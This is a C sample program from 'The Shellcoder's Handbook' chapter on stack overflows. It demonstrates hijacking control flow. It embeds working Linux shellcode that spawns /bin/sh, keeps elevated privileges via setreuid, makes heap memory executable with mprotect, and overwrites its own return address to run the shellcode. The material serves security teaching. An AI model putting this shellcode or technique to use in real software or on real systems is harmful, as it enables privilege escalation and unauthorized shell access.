/*

The Shellcoder's Handbook: Discovering and Exploiting Security Holes
Jack Koziol, David Litchfield, Dave Aitel, Chris Anley,
Sinan Eren, Neel Mehta, Riley Hassell
Publisher: John Wiley & Sons
ISBN: 0764544683

Chapter 2: Stack Overflows
Sample Program #5

Please send comments/feedback to jack@infosecinstitute.com or visit
http://www.infosecinstitute.com

*/

#include <stdlib.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>

int uflag = 1;
char buf[1024];

int main(int argc, char **argv)
{
char shellcode[] =
 "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
 "\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1"
 "\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";

	int s = strlen(shellcode)+1;
	void *p = malloc(s);

	if (setreuid(geteuid(),geteuid()))
		perror("setreuid");

	if (argc > 1)
		if (argv[1][1] == 'n') uflag = 0;

	printf("malloc %d bytes @ 0x%x\n", s, p); 
	memcpy(p, shellcode, s);
	printf("copied %d bytes @ 0x%x\n", s, p); 

	if (uflag) {
		int pagesize = getpagesize();
		void *page = (char *)(((int) p ) & ~(pagesize-1));
		printf("pagesize=%d p=0x%x page=0x%x\n", pagesize, p, page);
		if (mprotect(page, pagesize, PROT_READ|PROT_WRITE|PROT_EXEC)) {
			perror("mprotect");
			exit(1);
		}
		else
			printf("page 0x%x now executable\n", page);
	}

	sprintf(buf, "cat /proc/%d/maps", getpid());
	system(buf);

	function(p, 0x20, 0x21);

}

int function(void *p, int a, int b)
{

  int *ret;
  ret = (int *)&ret + 2;
  printf("return address on stack was 0x%x ", *ret);
  (*ret) = (int)p;
  printf("is now 0x%x\n", *ret);
}



